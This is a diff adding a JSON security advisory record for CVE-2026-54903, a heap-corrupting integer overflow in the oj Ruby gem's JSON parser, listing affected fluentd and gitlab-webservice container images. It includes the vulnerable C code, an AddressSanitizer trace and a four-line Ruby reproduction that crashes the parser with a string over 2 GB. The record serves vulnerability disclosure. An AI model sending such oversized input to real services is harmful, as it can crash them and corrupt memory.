@@ -1,0 +1,104 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-cga7-cxfs-uouy-57vd",
+  "modified": "2026-09-21T13:57:17Z",
+  "published": "2026-09-21T13:57:17Z",
+  "upstream": [
+    "CVE-2026-54903"
+  ],
+  "summary": "### Summary",
+  "details": "### Summary\n\n`Oj.load` is vulnerable to heap corruption when parsing a JSON string longer than 2 GB. An integer overflow in `buf_append_string` (`buf.h:61`) converts the string length to a large negative `size_t`, causing `memcpy` to copy an astronomically large amount of data out of bounds. This crashes the process and can corrupt adjacent heap memory.\n\n### Version\n\n- **Software**: oj gem\n- **Affected**: all versions with `ext/oj/buf.h` and `ext/oj/parse.c`\n- **Latest tested**: 3.17.1 (confirmed present)\n\n### Details\n\n`ext/oj/buf.h`, line 61:\n\n```c\ninline static void buf_append_string(Buf buf, const char *s, size_t slen) {\n    // ...\n    memcpy(buf->tail, s, slen);   // slen derived from 32-bit int that wrapped negative\n```\n\nIn `parse.c`, escape sequence handling computes the remaining string length as an `int`:\n\n```c\n// parse.c:402 (read_escaped_str)\nint  slen = (int)(s - str);   // ← wraps to negative when string > 2 GB\nbuf_append_string(buf, str, (size_t)slen);  // ← (size_t)(-2147483648) = 0x80000000...\n```\n\nASAN report:\n```\n==399019==ERROR: AddressSanitizer: negative-size-param: (size=-2147483648)\n    #0 __asan_memcpy\n    #1 buf_append_string  /ext/oj/buf.h:61\n    #2 read_escaped_str   /ext/oj/parse.c:402\n    #3 read_str           /ext/oj/parse.c:542\n    #4 oj_parse2          /ext/oj/parse.c:882\n    #5 oj_pi_parse        /ext/oj/parse.c:1256\n    #6 oj_object_parse    /ext/oj/object.c:701\n    #7 load               /ext/oj/oj.c:1259\n0x7f5a26ff0801 is located 1 bytes inside of 2147483657-byte region [0x7f5a26ff0800, 0x7f5aa6ff0809)\n```\n\n### Reproduce\n\n```ruby\nrequire 'oj'\nn = 1 << 31                         # 2 GB\njson = '\"' + ('A' * n) + 'A\"'  # >2GB JSON string with a trailing escape\nOj.load(json)\n```",
+  "severity": [
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "fluentd",
+        "purl": "pkg:docker/dhi/fluentd?os_name=debian&os_version=12"
+      },
+      "versions": [
+        "1.18.0-debian12",
+        "1.18.0-dev-debian12-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "fluentd",
+        "purl": "pkg:docker/dhi/fluentd?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "1.18.0-debian13",
+        "1.18.0-dev-debian13-dev",
+        "1.19.0-debian13",
+        "1.19.0-debian13-dev",
+        "1.19.0-dev-debian13-dev",
+        "1.19.1-debian13",
+        "1.19.1-debian13-dev",
+        "1.19.2-debian13",
+        "1.19.2-debian13-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "gitlab-webservice",
+        "purl": "pkg:docker/dhi/gitlab-webservice?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "18.11.1-debian13",
+        "18.11.1-debian13-dev",
+        "18.11.1-debian13-fips",
+        "18.11.1-debian13-fips-dev",
+        "18.11.3-debian13",
+        "18.11.3-debian13-dev",
+        "18.11.3-debian13-fips",
+        "18.11.3-debian13-fips-dev",
+        "18.11.4-debian13",
+        "18.11.4-debian13-dev",
+        "18.11.4-debian13-fips",
+        "18.11.4-debian13-fips-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-cga7-cxfs-uouy-57vd"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-475m-ph3x-64gp"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/ohler55/oj/security/advisories/GHSA-475m-ph3x-64gp"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://security-tracker.debian.org/tracker/CVE-2026-54903"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://ubuntu.com/security/CVE-2026-54903"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://people.ubuntu.com/~ubuntu-security/cve/CVE-2026-54903"
+    }
+  ]
+}
